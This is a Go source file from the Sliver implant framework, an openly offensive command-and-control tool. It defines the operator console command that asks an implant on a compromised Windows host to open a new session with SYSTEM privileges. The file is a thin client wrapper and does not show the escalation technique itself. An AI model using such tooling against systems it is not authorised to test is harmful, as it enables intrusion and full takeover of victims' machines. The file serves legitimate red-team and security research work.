package privilege

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/desertbit/grumble"
)

// GetSystemCmd - Windows only, attempt to get SYSTEM on the remote system
func GetSystemCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveSession.GetInteractive()
	if session == nil {
		return
	}
	process := ctx.Flags.String("process")
	config := con.GetActiveSessionConfig()
	ctrl := make(chan bool)
	con.SpinUntil("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)

	getsystemResp, err := con.Rpc.GetSystem(context.Background(), &clientpb.GetSystemReq{
		Request:        con.ActiveSession.Request(ctx),
		Config:         config,
		HostingProcess: process,
	})

	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if getsystemResp.GetResponse().GetErr() != "" {
		con.PrintErrorf("%s\n", getsystemResp.GetResponse().GetErr())
		return
	}
	con.Println()
	con.PrintInfof("A new SYSTEM session should pop soon...\n")
}
